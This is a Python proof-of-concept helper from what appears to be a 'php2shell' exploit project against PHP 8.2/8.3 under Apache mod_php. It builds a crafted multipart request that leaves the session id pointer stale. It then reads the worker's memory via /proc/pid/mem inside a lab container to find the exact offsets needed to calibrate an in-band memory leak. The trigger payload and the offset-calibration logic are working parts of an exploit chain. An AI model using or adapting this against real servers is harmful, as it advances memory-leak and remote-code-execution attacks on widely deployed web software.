#!/usr/bin/env python3
"""Ground-truth reader for `PS(id)` in a mod_php worker (Plan A, A1).

Reads the session id zend_string pointer straight out of the worker's
`php_ps_globals` (`ps_globals.id`, offset 0x10) via `/proc/<pid>/mem`, plus the
libphp base from `/proc/<pid>/maps`. This is the lab-assisted oracle used to
calibrate the in-band leak: it tells you the *exact* chunk offset of the stale
slot, instead of guessing `LEAK_SPEC` page numbers.

Requires a container started with `--cap-add=SYS_PTRACE`.

Usage:
  # seed + arm with the mod_php-chain producer, then print the stale id
  docker run -d --cap-add=SYS_PTRACE -p 18137:80 ... php:8.2.34-apache
  python3 poc/probe_ps_globals.py --container p2s-834-sp --port 18137 \
      --producer modphp

  # read without arming
  python3 poc/probe_ps_globals.py --container p2s-834-sp

Lab-only, read-only (plus the benign OOM producer).
"""

import argparse
import os
import struct
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from php2shell import amplify, probe

BOUNDARY = "MPC"
ID_OFFSET = 0x10          # php_ps_globals: save_path(8), session_name(8), id(8)


def _sh(container, cmd):
    return subprocess.run(["docker", "exec", container, "sh", "-c", cmd],
                          capture_output=True, text=True)


def worker_pid(container):
    out = _sh(container, "pgrep -x apache2 | grep -v '^1$' | sort -n | tail -1")
    return int(out.stdout.strip())


def ps_globals_offset(container):
    out = _sh(container,
              "readelf -sW /usr/lib/apache2/modules/libphp.so "
              "| grep -E ' ps_globals$' | head -1")
    for line in out.stdout.splitlines():
        parts = line.split()
        if parts and parts[-1] == "ps_globals":
            return int(parts[1], 16)
    raise RuntimeError("ps_globals symbol not found")


def libphp_base(container, pid):
    out = _sh(container, f"grep libphp /proc/{pid}/maps | head -1 | cut -d- -f1")
    return int(out.stdout.strip(), 16)


def read_mem(container, pid, addr, n):
    out = subprocess.run(
        ["docker", "exec", container, "sh", "-c",
         f"dd if=/proc/{pid}/mem iflag=skip_bytes,count_bytes "
         f"skip={addr} count={n} bs=1 2>/dev/null"],
        capture_output=True)
    return out.stdout


def read_id(container, pid=None):
    pid = pid or worker_pid(container)
    base = libphp_base(container, pid)
    ptr = struct.unpack("<Q", read_mem(container, pid,
                                       base + ps_globals_offset(container)
                                       + ID_OFFSET, 8))[0]
    result = {"pid": pid, "libphp": base, "id": ptr}
    if ptr:
        raw = read_mem(container, pid, ptr, 24 + 64)
        if len(raw) >= 24:
            rc, typ, h, ln = struct.unpack_from("<IIQQ", raw, 0)
            result.update(refcount=rc, type=typ, length=ln,
                          val=raw[24:24 + min(ln, 64)],
                          chunk=ptr & ~0x1FFFFF,
                          offset=ptr & 0x1FFFFF)
    return result


def _multipart(parts):
    b = BOUNDARY.encode()
    out = bytearray()
    for name, filename, data in parts:
        out.extend(b"--" + b + b"\r\nContent-Disposition: form-data; name=\"" +
                   name.encode() + b"\"")
        if filename is not None:
            out.extend(b"; filename=\"" + filename.encode() + b"\"")
        out.extend(b"\r\n\r\n" + data.encode("latin-1") + b"\r\n")
    out.extend(b"--" + b + b"--\r\n")
    return bytes(out)


def modphp_producer(records=2000, depth=60, sid="\x00"):
    """The producer that leaves PS(id) stale on 8.2/8.3 (ASAN-proven shape)."""
    parts = [("PHPSESSID", None, sid),
             ("PHP_SESSION_UPLOAD_PROGRESS", None, "x"),
             ("f", "a.bin", "Z")]
    parts += [(f"r{i}" + "[a]" * (depth - 1), "", "") for i in range(records)]
    return _multipart(parts)


def arm(container, port, producer):
    if producer == "a1":
        from php2shell import remote
        amplify.send_chunked("127.0.0.1", port, "/index.php" + remote.Q,
                             _a1(), "multipart/form-data", boundary="C" * 10,
                             timeout=120)
    elif producer == "modphp":
        body = modphp_producer()
        probe.http_post("127.0.0.1", port, "/index.php", body,
                        headers={"Content-Type":
                                 f"multipart/form-data; boundary={BOUNDARY}"},
                        timeout=120, recv_timeout=120)


def _a1():
    from php2shell import remote
    return remote.a1_body()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--container", required=True)
    ap.add_argument("--port", type=int, default=None)
    ap.add_argument("--producer", choices=["none", "a1", "modphp"],
                    default="none")
    ap.add_argument("--records", type=int, default=2000)
    ap.add_argument("--depth", type=int, default=60)
    args = ap.parse_args()

    if args.producer != "none":
        if args.port is None:
            sys.exit("--port is required with --producer")
        arm(args.container, args.port, args.producer)
        time.sleep(0.3)

    info = read_id(args.container)
    print(f"container:   {args.container}")
    print(f"worker pid:  {info['pid']}")
    print(f"libphp base: {info['libphp']:#x}")
    if not info["id"]:
        print("PS(id):      NULL (no stale session id)")
        return 0
    print(f"PS(id):      {info['id']:#x}")
    print(f"  chunk:     {info.get('chunk', 0):#x}")
    print(f"  offset:    {info.get('offset', 0):#x}   "
          f"(hint: leak H offset = offset - 0x1018)")
    print(f"  zend_str:  len={info.get('length')} type={info.get('type', 0):#x} "
          f"val={info.get('val', b'')!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
